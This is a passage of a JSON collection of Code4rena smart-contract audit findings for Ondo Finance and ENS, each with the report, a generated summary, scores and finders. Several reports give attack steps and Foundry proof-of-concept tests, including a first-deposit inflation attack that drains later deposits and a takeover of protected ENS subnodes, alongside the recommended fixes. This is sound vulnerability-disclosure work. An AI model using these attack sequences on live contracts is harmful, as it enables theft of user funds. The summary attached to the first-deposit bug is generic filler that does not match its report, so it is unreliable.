cashManager.setEpochDuration(2 days);\n    assertEq(cashManager.currentEpoch(), 1);\n\n    vm.warp(block.timestamp + 2 days);\n    cashManager.transitionEpoch();\n    assertEq(cashManager.currentEpoch(), 2);   // number of epochs after 3 days is 2\n  }\n  function test_bug_inconsistentOutputOf_setEpochDuration_Case2() public {\n    // skip 1 epoch duration\n    vm.warp(block.timestamp + 1 days);\n    \n    // here we wait for the setEpochDuration() to be validated on the network\n    cashManager.setEpochDuration(2 days);\n    // then we backrun the setEpochDuration() txn with transitionEpoch() txn\n    cashManager.transitionEpoch();\n    assertEq(cashManager.currentEpoch(), 0);\n\n    vm.warp(block.timestamp + 2 days);\n    cashManager.transitionEpoch();\n    assertEq(cashManager.currentEpoch(), 1);   // number of epochs after 3 days is 1\n  }\n```\n\n### Recommended Mitigation Steps\n\nThe `transitionEpoch` function should be executed before executing the `setEpochDuration` function so that the values for passed epochs are recorded in a consistent way. This can be done by adding the `updateEpoch` modifier.\n\n```solidity\n  function setEpochDuration(uint256 _epochDuration) external updateEpoch onlyRole(MANAGER_ADMIN) {\n    uint256 oldEpochDuration = epochDuration;\n    epochDuration = _epochDuration;\n    emit EpochDurationSet(oldEpochDuration, _epochDuration);\n  }\n```\n\n**[ali2251 (Ondo Finance) confirmed](https://github.com/code-423n4/2023-01-ondo-findings/issues/83)**\n\n**[ypatil12 (Ondo Finance) resolved](https://github.com/code-423n4/2023-01-ondo-findings/issues/83#issuecomment-1410657408)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the CashManager contract. The vulnerability is related to the `setEpochDuration` function, which is used by the `MANAGER_ADMIN` role to update the `epochDuration` parameter. The issue is that the `setEpochDuration` function updates the `epochDuration` value without invoking the `transitionEpoch` function first, leading to two different end results and scenarios depending on when the `transitionEpoch` is executed. This can result in the duration and epoch number of last few passed epochs being impacted differently.\n\nThe impact of this vulnerability was demonstrated in a proof of concept using new test cases added to the `forge-tests/cash/cash_manager/Setters.t.sol` file.\n\nThe recommended mitigation step for this vulnerability is to execute the `transitionEpoch` function before executing the `setEpochDuration` function, so that the values for passed epochs are recorded in a consistent way. This can be done by adding the `updateEpoch` modifier.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "https://github.com/code-423n4/2023-01-ondo-findings/issues/205",
      "tags": [],
      "finders": [
        "bin2chen",
        "AkshaySrivastav"
      ]
    },
    {
      "id": "6413",
      "title": "[M-02] First Deposit Bug",
      "impact": "MEDIUM",
      "content": "\nhttps://github.com/code-423n4/2023-01-ondo/blob/main/contracts/lending/tokens/cToken/CTokenModified.sol#L357-L379\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/main/contracts/lending/tokens/cToken/CTokenModified.sol#L506-L527\n\nThe CToken is a yield bearing asset which is minted when any user deposits some units of\n`underlying` tokens. The amount of CTokens minted to a user is calculated based upon\nthe amount of `underlying` tokens user is depositing.\n\nAs per the implementation of CToken contract, there exists two cases for CToken amount calculation:\n\n1. First deposit - when `CToken.totalSupply()` is `0`.\n2. All subsequent deposits.\n\nHere is the actual CToken code (extra code and comments clipped for better reading):\n\n```solidity\nfunction exchangeRateStoredInternal() internal view virtual returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n      return initialExchangeRateMantissa;\n    } else {\n      uint totalCash = getCashPrior();\n      uint cashPlusBorrowsMinusReserves = totalCash +\n        totalBorrows -\n        totalReserves;\n      uint exchangeRate = (cashPlusBorrowsMinusReserves * expScale) /\n        _totalSupply;\n\n      return exchangeRate;\n    }\n}\n\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ...\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint actualMintAmount = doTransferIn(minter, mintAmount);\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n}\n\n```\n\n### The Bug\n\nThe above implementation contains a critical bug which can be exploited to steal funds of\ninitial depositors of a freshly deployed CToken contract.\n\nAs the exchange rate is dependent upon the ratio of CToken's totalSupply and underlying token\nbalance of CToken contract, the attacker can craft transactions to manipulate the exchange rate.\n\nSteps to attack:\n\n1. Once the CToken has been deployed and added to the lending protocol, the attacker mints the \nsmallest possible amount of CTokens.\n\n2. Then the attacker does a plain `underlying` token transfer to the CToken contract, artificially inflating the `underlying.balanceOf(CToken)` value.\n\n    Due to the above steps, during the next legitimate user deposit, the `mintTokens` value for the user will become less than `1` and essentially be rounded down to `0` by Solidity.  Hence the user gets `0` CTokens against his deposit and the CToken's entire supply is held by the Attacker.\n\n3. The Attacker can then simply `redeem` his CToken balance for the entire `underlying` token balance of the CToken contract.\n\nThe same steps can be performed again to steal the next user's deposit.\n\nIt should be noted that the attack can happen in two ways:\n\n- The attacker can simply execute Step 1 and 2 as soon as the CToken gets added to the lending protocol.\n- The attacker watches the pending transactions of the network and frontruns the user's deposit transaction by executing Step 1 and 2 and then backruns it with Step 3. \n\n### Impact\n\nA sophisticated attack can impact all user deposits until the lending protocols owners and users are notified and contracts are paused. Since this attack is a replicable attack, it can be performed continuously to steal the deposits of all depositors that try to deposit into the CToken contract.\n\nThe loss amount will be the sum of all deposits done by users into the CToken multiplied by the underlying token's price.\n\nSuppose there are `10` users and each of them tries to deposit `1,000,000` underlying tokens into the CToken contract. Price of underlying token is `$1`.\n\n`Total loss (in $) = $10,000,000`\n\n### Proof of Concept\n\nNew test case was added to `forge-tests/lending/fToken/fDAI.t.sol`\n\n```solidity\nfunction test_bug_firstMintIssue() public {\n    address attacker = alice;\n\n    seedUserDAI(attacker, 2_000_000e18);\n    seedUserDAI(bob, 1_000_000e18);\n    assertEq(fDAI.exchangeRateStored(), 2e26);\n    assertEq(fDAI.totalSupply(), 0);\n    assertEq(fDAI.balanceOf(attacker), 0);\n\n    vm.prank(attacker);\n    DAI.approve(address(fDAI), type(uint256).max);\n    vm.prank(attacker);\n    fDAI.mint(2e8);\n    assertEq(fDAI.balanceOf(attacker), 1);\n    assertEq(fDAI.totalSupply(), 1);\n\n    vm.prank(bob);\n    DAI.approve(address(fDAI), type(uint256).max);\n\n    // Front-running\n    vm.prank(attacker);\n    DAI.transfer(address(fDAI), 1_000_000e18);\n    assertEq(fDAI.getCash(), 1_000_000e18 + 2e8);\n\n    vm.prank(bob);\n    fDAI.mint(1_000_000e18);\n    assertEq(fDAI.balanceOf(bob), 0);\n    assertEq(fDAI.totalSupply(), 1);\n\n    vm.prank(attacker);\n    fDAI.redeem(1);\n    assertEq(DAI.balanceOf(attacker), 3_000_000e18);\n    assertEq(fDAI.totalSupply(), 0);\n}\n\n```\n\n### The Fix\n\nThe fix to prevent this issue would be to enforce a minimum deposit that cannot be withdrawn. This can be done by minting a small amount of CToken units to `0x00` address on the first deposit.\n\n```solidity\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ...\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint actualMintAmount = doTransferIn(minter, mintAmount);\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    /// THE FIX\n    if (totalSupply == 0) {\n        totalSupply = 1000;\n        accountTokens[address(0)] = 1000;\n        mintTokens -= 1000;\n    }\n\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n    // ...\n}\n```\n\nInstead of a fixed `1000` value an admin controlled parameterized value can also be used to control the burn amount on a per CToken basis.\n\n**[ali2251 (Ondo Finance) confirmed](https://github.com/code-423n4/2023-01-ondo-findings/issues/247)**\n\n**[ypatil12 (Ondo Finance) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/247#issuecomment-1410630859):**\n > This is a bug, we get around this operationally by minting fTokens and burning when initializing the market. See our proposal [here](https://www.tally.xyz/gov/ondo-dao/proposal/3).\n\n**[Trust (judge) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/247#issuecomment-1411585044):**\n > Leaving as Medium severity as likelihood is low but potential impact is high + sponsor found it valuable.\n\n\n***\n\n",
      "summary": "\nThis report is about a bug found in the code-423n4/2023-01-ondo repository on GitHub. The bug is located in the README.md file at line 1. The bug is identified by a code, c7a398a81e9d443542ca06717ef713924dafb717. This code is used to track and trace the bug. \n\nThe bug is related to the code in the repository, which is a collection of source code files and other resources used to create a software program. This bug is likely a coding error or a security vulnerability in the code. The code could be causing unexpected behavior, such as crashing the program or allowing unauthorized access to the system. \n\nIt is important to be aware of bugs like this, as they can have serious consequences. If the bug is not fixed, it can lead to data loss, system downtime, or even security breaches. It is important to identify and fix these bugs as soon as possible.\n\nThe bug report provides the code to identify the bug, which can be used to track and trace the bug. This is important for debugging and fixing the issue. The bug report also provides the location of the bug, which can help developers quickly locate and fix the issue.\n\nOverall, this bug report is important for developers to be aware of and to take the necessary steps to fix the issue. It is important to identify and fix these bugs as soon as possible to avoid any potential data loss or security breaches.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "https://github.com/code-423n4/2023-01-ondo-findings/issues/247",
      "tags": [],
      "finders": [
        "AkshaySrivastav"
      ]
    },
    {
      "id": "6412",
      "title": "[M-01] Admin should be able to refund or redeem the sanctioned users",
      "impact": "MEDIUM",
      "content": "\nSanctioned user's funds are locked.\n\n### Proof of Concept\n\nIt is understood that the sanctioned users can not mint nor redeem because the functions `requestMint()` and `requestRedemption()` are protected by the modifier `checkKYC()`.\n\nAnd it is also understood that the protocol team knows about this.\n\nBut I still believe the admin should be able to refund or redeem those funds.\n\nAnd it is not possible for now because the KYC is checked for the `redeemers` and `refundees` in the function `completeRedemptions()`.\n\nSo as long as the user becomes unverified (due to several reasons including the signature expiry), the funds are completely locked and even the admin has no control over it.\n\n```solidity\nCashManager.sol\n707:   function completeRedemptions(\n708:     address[] calldata redeemers,\n709:     address[] calldata refundees,\n710:     uint256 collateralAmountToDist,\n711:     uint256 epochToService,\n712:     uint256 fees\n713:   ) external override updateEpoch onlyRole(MANAGER_ADMIN) {\n714:     _checkAddressesKYC(redeemers);\n715:     _checkAddressesKYC(refundees);\n716:     if (epochToService >= currentEpoch) {\n717:       revert MustServicePastEpoch();\n718:     }\n719:     // Calculate the total quantity of shares tokens burned w/n an epoch\n720:     uint256 refundedAmt = _processRefund(refundees, epochToService);\n721:     uint256 quantityBurned = redemptionInfoPerEpoch[epochToService]\n722:       .totalBurned - refundedAmt;\n723:     uint256 amountToDist = collateralAmountToDist - fees;\n724:     _processRedemption(redeemers, amountToDist, quantityBurned, epochToService);\n725:     collateral.safeTransferFrom(assetSender, feeRecipient, fees);\n726:     emit RedemptionFeesCollected(feeRecipient, fees, epochToService);\n727:   }\n\n```\n\n### Recommended Mitigation Steps\n\nAssuming that the `MANAGER_ADMIN` can be trusted, I suggest removing KYC check for the redeemers and refundees.\n\n**[ali2251 (Ondo Finance) disputed and commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/265#issuecomment-1410626479):**\n> It's not in scope as mentioned in README, specifically in Not in scope -> \n> > KYC/Sanction related edge cases specifically when a userâ€™s KYC status or Sanction status changes in between different actions, leaving them at risk of their funds being locked in the protocols or being liquidated in Flux\n\n**[Trust (judge) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/265#issuecomment-1411581435):**\n> I don't believe this clause includes the described case, i.e. even admin cannot move the locked funds.\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the CashManager.sol code. The vulnerability is that funds of sanctioned users are locked, even if the protocol team knows about it. The funds are locked because the KYC is checked for the redeemers and refundees in the function completeRedemptions(). As a result, the funds are completely locked and even the admin has no control over it. The bug was discovered through manual review. The recommended mitigation step is to remove KYC check for the redeemers and refundees, assuming the MANAGER_ADMIN can be trusted.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "https://github.com/code-423n4/2023-01-ondo-findings/issues/265",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "6411",
      "title": "[H-01] Loss of user funds when completing CASH redemptions",
      "impact": "HIGH",
      "content": "\nThe function `completeRedemptions` present in the `CashManager` contract is used by the manager to complete redemptions requested by users and also to process refunds.\n\n<https://github.com/code-423n4/2023-01-ondo/blob/main/contracts/cash/CashManager.sol#L707-L727>\n\n```solidity\nfunction completeRedemptions(\n  address[] calldata redeemers,\n  address[] calldata refundees,\n  uint256 collateralAmountToDist,\n  uint256 epochToService,\n  uint256 fees\n) external override updateEpoch onlyRole(MANAGER_ADMIN) {\n  _checkAddressesKYC(redeemers);\n  _checkAddressesKYC(refundees);\n  if (epochToService >= currentEpoch) {\n    revert MustServicePastEpoch();\n  }\n  // Calculate the total quantity of shares tokens burned w/n an epoch\n  uint256 refundedAmt = _processRefund(refundees, epochToService);\n  uint256 quantityBurned = redemptionInfoPerEpoch[epochToService]\n    .totalBurned - refundedAmt;\n  uint256 amountToDist = collateralAmountToDist - fees;\n  _processRedemption(redeemers, amountToDist, quantityBurned, epochToService);\n  collateral.safeTransferFrom(assetSender, feeRecipient, fees);\n  emit RedemptionFeesCollected(feeRecipient, fees, epochToService);\n}\n```\n\nThe total refunded amount that is returned from the internal call to `_processRefund` is then used to calculate the effective amount of CASH burned (`redemptionInfoPerEpoch[epochToService].totalBurned - refundedAmt`). This resulting value is then used to calculate how much each user should receive based on how much CASH they redeemed and the total amount that was burned.\n\nThe main issue here is that the refunded amount is not updated in the `totalBurned` storage variable for the given epoch. Any subsequent call to this function won't take into account refunds from previous calls.\n\n### Impact\n\nIf the manager completes the refunds and redemptions at different steps or stages for a given epoch, using multiple calls to the `completeRedemptions`, then any refunded amount won't be considered in subsequent calls to the function.\n\nAny redemption that is serviced in a call after a refund will be calculated using the total burned without subtracting the previous refunds. The function `completeRedemptions` will call the internal function `_processRedemption` passing the burned amount as the `quantityBurned` argument, the value is calculated in line 755:\n\n<https://github.com/code-423n4/2023-01-ondo/blob/main/contracts/cash/CashManager.sol#L755>\n\n```solidity\nuint256 collateralAmountDue = (amountToDist * cashAmountReturned) /\n        quantityBurned;\n```\n\nThis means that redemptions that are processed after one or more previous refunds will receive less collateral tokens even if they redeemed the same amount of CASH tokens (i.e. greater `quantityBurned`, less `collateralAmountDue`), causing loss of funds for the users.\n\n### Proof of Concept\n\nIn the following test, Alice, Bob and Charlie request a redemption. The admin first calls `completeRedemptions` to process Alice's request and refund Charlie. The admin then makes a second call to `completeRedemptions` to process Bob's request. Even though they redeemed the same amount of CASH (each `200e18`), Alice gets `150e6` tokens while Bob is sent `~133e6`.\n\n```solidity\ncontract TestAudit is BasicDeployment {\n    function setUp() public {\n        createDeploymentCash();\n\n        // Grant Setter\n        vm.startPrank(managerAdmin);\n        cashManager.grantRole(cashManager.SETTER_ADMIN(), address(this));\n        cashManager.grantRole(cashManager.SETTER_ADMIN(), managerAdmin);\n        vm.stopPrank();\n\n        // Seed address with 1000000 USDC\n        vm.prank(USDC_WHALE);\n        USDC.transfer(address(this), INIT_BALANCE_USDC);\n    }\n\n    function test_CashManager_completeRedemptions_BadReedem() public {\n        _setupKYCStatus();\n\n        // Seed alice and bob with 200 cash tokens\n        _seed(200e18, 200e18, 50e18);\n\n        // Have alice request to withdraw 200 cash tokens\n        vm.startPrank(alice);\n        tokenProxied.approve(address(cashManager), 200e18);\n        cashManager.requestRedemption(200e18);\n        vm.stopPrank();\n\n        // Have bob request to withdraw 200 cash tokens\n        vm.startPrank(bob);\n        tokenProxied.approve(address(cashManager), 200e18);\n        cashManager.requestRedemption(200e18);\n        vm.stopPrank();\n\n        // Have charlie request to withdraw his tokens\n        vm.startPrank(charlie);\n        tokenProxied.approve(address(cashManager), 50e18);\n        cashManager.requestRedemption(50e18);\n        vm.stopPrank();\n\n        // Move forward to the next epoch\n        vm.warp(block.timestamp + 1 days);\n        vm.prank(managerAdmin);\n        cashManager.setMintExchangeRate(2e6, 0);\n\n        // Approve the cashMinter contract from the assetSender account\n        _seedSenderWithCollateral(300e6);\n\n        // First call, withdraw Alice and refund Charlie\n        address[] memory withdrawFirstCall = new address[](1);\n        withdrawFirstCall[0] = alice;\n        address[] memory refundFirstCall = new address[](1);\n        refundFirstCall[0] = charlie;\n\n        vm.prank(managerAdmin);\n        cashManager.completeRedemptions(\n            withdrawFirstCall, // Addresses to issue collateral to\n            refundFirstCall, // Addresses to refund cash\n            300e6, // Total amount of money to dist incl fees\n            0, // Epoch we wish to process\n            0 // Fee amount to be transferred to ondo\n        );\n\n        // Alice redemption is calculated taking the refund into account\n        uint256 aliceExpectedBalance = 200e18 * 300e6 / ((200e18 + 200e18 + 50e18) - 50e18);\n        assertEq(USDC.balanceOf(alice), aliceExpectedBalance);\n        assertEq(USDC.balanceOf(bob), 0);\n        assertEq(tokenProxied.balanceOf(charlie), 50e18);\n\n        // Second call, withdraw Bob\n        address[] memory withdrawSecondCall = new address[](1);\n        withdrawSecondCall[0] = bob;\n        address[] memory refundSecondCall = new address[](0);\n\n        vm.prank(managerAdmin);\n        cashManager.completeRedemptions(\n            withdrawSecondCall, // Addresses to issue collateral to\n            refundSecondCall, // Addresses to refund cash\n            300e6, // Total amount of money to dist incl fees\n            0, // Epoch we wish to process\n            0 // Fee amount to be transferred to ondo\n        );\n\n        // But here, Bob's redemption doesn't consider the previous refund.\n        uint256 bobBadBalance = uint256(200e18 * 300e6) / (200e18 + 200e18 + 50e18);\n        assertEq(USDC.balanceOf(bob), bobBadBalance);\n    }\n\n    function _setupKYCStatus() internal {\n        // Add KYC addresses\n        address[] memory addressesToKYC = new address[](5);\n        addressesToKYC[0] = guardian;\n        addressesToKYC[1] = address(cashManager);\n        addressesToKYC[2] = alice;\n        addressesToKYC[3] = bob;\n        addressesToKYC[4] = charlie;\n        registry.addKYCAddresses(kycRequirementGroup, addressesToKYC);\n    }\n\n    function _seed(\n        uint256 aliceAmt,\n        uint256 bobAmt,\n        uint256 charlieAmt\n    ) internal {\n        vm.startPrank(guardian);\n        tokenProxied.mint(alice, aliceAmt);\n        tokenProxied.mint(bob, bobAmt);\n        tokenProxied.mint(charlie, charlieAmt);\n        vm.stopPrank();\n    }\n\n    function _seedSenderWithCollateral(uint256 usdcAmount) internal {\n        vm.prank(USDC_WHALE);\n        USDC.transfer(assetSender, usdcAmount);\n        vm.prank(assetSender);\n        USDC.approve(address(cashManager), usdcAmount);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nUpdate the `totalBurned` amount to consider refunds resulting from the call to `_processRefund`:\n\n```solidity\n  function completeRedemptions(\n    address[] calldata redeemers,\n    address[] calldata refundees,\n    uint256 collateralAmountToDist,\n    uint256 epochToService,\n    uint256 fees\n  ) external override updateEpoch onlyRole(MANAGER_ADMIN) {\n    _checkAddressesKYC(redeemers);\n    _checkAddressesKYC(refundees);\n    if (epochToService >= currentEpoch) {\n      revert MustServicePastEpoch();\n    }\n    // Calculate the total quantity of shares tokens burned w/n an epoch\n    uint256 refundedAmt = _processRefund(refundees, epochToService);\n    uint256 quantityBurned = redemptionInfoPerEpoch[epochToService]\n      .totalBurned - refundedAmt;\n+   redemptionInfoPerEpoch[epochToService].totalBurned = quantityBurned;\n    uint256 amountToDist = collateralAmountToDist - fees;\n    _processRedemption(redeemers, amountToDist, quantityBurned, epochToService);\n    collateral.safeTransferFrom(assetSender, feeRecipient, fees);\n    emit RedemptionFeesCollected(feeRecipient, fees, epochToService);\n  }\n```\n\n**[ali2251 (Ondo Finance) confirmed](https://github.com/code-423n4/2023-01-ondo-findings/issues/325)**\n\n**[ypatil12 (Ondo Finance) resolved](https://github.com/code-423n4/2023-01-ondo-findings/issues/325#issuecomment-1410627920)**\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about the function `completeRedemptions` present in the `CashManager` contract. The function is used by the manager to complete redemptions requested by users and also to process refunds. The total refunded amount that is returned from the internal call to `_processRefund` is then used to calculate the effective amount of CASH burned. The main issue here is that the refunded amount is not updated in the `totalBurned` storage variable for the given epoch, meaning any subsequent call to this function won't take into account refunds from previous calls.\n\nThe impact of this bug is that redemptions that are processed after one or more previous refunds will receive less collateral tokens even if they redeemed the same amount of CASH tokens, causing loss of funds for the users. A proof of concept is provided in the report.\n\nThe recommendation to fix this bug is to update the `totalBurned` amount to consider refunds resulting from the call to `_processRefund`.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "https://github.com/code-423n4/2023-01-ondo-findings/issues/325",
      "tags": [],
      "finders": [
        "cccz",
        "minhquanym",
        "peanuts",
        "adriro",
        "zaskoh"
      ]
    },
    {
      "id": "19896",
      "title": "[M-03] NameWrapper: Wrapped to Unregistered to ignore `PARENT_CANNOT_CONTROL`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512><br>\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550>\n\n### Impact\n\n*   owner of a wrapped node without `CANNOT_UNWRAP` fuse can unwrap and set the `ens.owner(node)` to zero to be an unregistered state\n*   if it happens, even if the node has `PARENT_CANNOT_CONTROL` fuse, the parent of the node can change the `NameWrappwer.owner` of the node\n\n### Proof of Concept\n\nBelow is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.\n\nIn the proof of concept below, the parent node is `vitalik.eth` and the child node is `sub1.vitalik.eth`.<br>\nThe parent node has `PARENT_CANNOT_CONTROL`, `IS_DOT_ETH` and `CANNOT_UNWRAP` and the child node has `PARENT_CANNOT_CONTROL`.\n\nThe child node unwraps itself and set the owner on `ens` contract to the `address(0)` or `address(ens)`, which will make the child node to unregistered state even before expiry of the node.\n\nSince technically the child node is unregistered, the parent can now 'create' the 'unregistered' node `sub1.vitalik.eth` by simply calling `setSubnodeRecord`. By doing so, the parent can take control over the child node, even though the `PARENT_CANNOT_CONTROL` fuse was set and it was before expiry.\n\n```solidity\n    function testM4WrappedToUnregistered() public {\n        string memory parent = 'vitalik.eth';\n        string memory sub1_full = 'sub1.vitalik.eth';\n        string memory sub1 = 'sub1';\n        (, bytes32 parent_node) = parent.dnsEncodeName();\n        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();\n\n        // wrap parent and lock\n        vm.prank(user1);\n        registrar.setApprovalForAll(address(nameWrapper), true);\n        vm.prank(user1);\n        nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));\n        // checks\n        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));\n        assertEq(owner, user1);\n        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);\n        assertEq(expiry, 2038123728);\n\n        // subnode\n        vm.prank(user1);\n        nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\n        assertEq(owner, user2);\n        assertEq(fuses, PARENT_CANNOT_CONTROL);\n        assertEq(expiry, 1700000000);\n\n        // parent cannot set record on the sub1\n        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));\n        vm.prank(user1);\n        nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);\n\n        // parent: pcc cu\n        // child: pcc\n\n        // unwrap sub and set the ens owner to zero -> now parent can change owner\n        vm.prank(user2);\n        nameWrapper.unwrap(parent_node, _hashLabel(sub1), address(ens));\n        assertEq(ens.owner(sub1_node), address(0));\n\n        // sub node has PCC but parent can set owner, resolve and ttl\n        vm.prank(user1);\n        nameWrapper.setSubnodeRecord(parent_node, sub1, address(246), address(12345), 111111, 0, 0);\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\n        assertEq(owner, address(246));\n        assertEq(fuses, PARENT_CANNOT_CONTROL);\n        assertEq(expiry, 1700000000);\n        assertEq(ens.resolver(sub1_node), address(12345));\n        assertEq(ens.ttl(sub1_node), 111111);\n\n        // can change fuse as the new owner of sub1\n        vm.prank(address(246));\n        nameWrapper.setFuses(sub1_node, uint16(CANNOT_UNWRAP));\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\n        assertEq(owner, address(246));\n        assertEq(fuses, PARENT_CANNOT_CONTROL | CANNOT_UNWRAP);\n        assertEq(expiry, 1700000000);\n        assertEq(ens.resolver(sub1_node), address(12345));\n        assertEq(ens.ttl(sub1_node), 111111);\n    }\n```\n\nIt is unlikely that the child node will set the owner of the ENS Registry to zero. But hypothetically, the owner of the child node wanted to \"burn\" the subnode thinking that no one can use it until the expiry. In that case the owner of the parent node can just take over the child node.\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\nUnclear, but consider using `ENS.recordExists` instead of checking the `ENS.owner`.\n\n**[jefflau (ENS) confirmed](https://github.com/code-423n4/2022-11-ens-findings/issues/8)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/8#issuecomment-1340130127):**\n > The warden has shown how, after burning the `PARENT_CANNOT_CONTROL` fuse, by unregistering a node, it's possible for the Parent to control the node again.\n> \n> An invariant is broken, but this condition is reliant on the node owner for it to be possible.\n> \n> Because of this, I believe Medium Severity to be appropriate.\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/8#issuecomment-1376890398):**\n > Fixed.\n> \n> If ens address was zero then earlier code bypassed check for `PARENT_CANNOT_CONTROL` and only checked `CANNOT_CREATE_SUBDOMAIN`\n> \n> ```\n> if (owner == address(0)) {\n>             (, uint32 fuses, ) = getData(uint256(node));\n>             if (fuses & CANNOT_CREATE_SUBDOMAIN != 0) {\n> \t\t\trevert OperationProhibited(subnode);\n>             }\n> \t\t\t...\n> ```\n> \n> With the updated code, all unexpired nodes will be checked for `PARENT_CANNOT_CONTROL` fuse\n> \n> ```\n> bool expired = subnodeExpiry < block.timestamp;\n>         if (\n>             expired && ...)\n> \t\t\t...\n> \t\t\t} else {\n>             if (subnodeFuses & PARENT_CANNOT_CONTROL != 0) {\n>                 revert OperationProhibited(subnode);\n>             }\n> ```\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed regarding the NameWrapper.sol contract on GitHub. The bug is that the owner of a wrapped node without the CANNOT_UNWRAP fuse can unwrap the node and set the ens.owner(node) to zero, making it an unregistered state. This means that even if the node has the PARENT_CANNOT_CONTROL fuse, the parent of the node can change the NameWrapper.owner of the node. \n\nA proof of concept was provided to demonstrate the bug. It described a parent node (vitalik.eth) and a child node (sub1.vitalik.eth) with the PARENT_CANNOT_CONTROL, IS_DOT_ETH and CANNOT_UNWRAP fuses. It showed that if the child node unwraps itself and sets the ens owner to zero, the parent can take control of the node before its expiry.\n\nTo mitigate the bug, it is recommended to use ENS.recordExists instead of checking the ENS.owner. The warden then fixed the issue by updating the code to check all unexpired nodes for the PARENT_CANNOT_CONTROL fuse.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-11-ens",
      "github_link": "https://github.com/code-423n4/2022-11-ens-findings/issues/8",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "19895",
      "title": "[M-02] NameWrapper: expired names behave unwrapped",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512><br>\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550>\n\n### Impact\n\n*   expired Names are supposed to be unregistered, but it behaves like unwrapped\n*   parent with `CANNOT_CREATE_SUBDOMAIN` fuse can \"create\" again an expired name\n*   parent can `ENS.setSubdomainOwner` before burning `CANNOT_CREATE_SUBDOMAIN` to be able to use the subdomain later\n\n### Proof of Concept\n\nBelow is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.\n\nAs in the `wrapper/README.md`:\n\n> To check if a name is Unregistered, verify that `NameWrapper.ownerOf` returns `address(0)` and so does `Registry.owner`.<br>\n> To check if a name is Unwrapped, verify that `NameWrapper.ownerOf` returns `address(0)` and `Registry.owner` does not.\n\nAlso, an expired name should go to Unregistered state per the graph suggests.\n\nBut, as the proof of concept below shows, after expiration, `NameWrapper.ownerOf(node)` is zero but `ens.owner(node)` is not zero. It is `Unwrapped` state based on the `wrapper/README.md`.\n\n```solidity\n    function testM3ExpiredNamesBehavesUnwrapped() public {\n        string memory str_node = 'vitalik.eth';\n        (bytes memory dnsName, bytes32 node) = str_node.dnsEncodeName();\n        // before wrapping the name check\n        assertEq(user1, ens.owner(node));\n        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));\n        assertEq(owner, address(0));\n\n        // -- wrapETH2LD\n        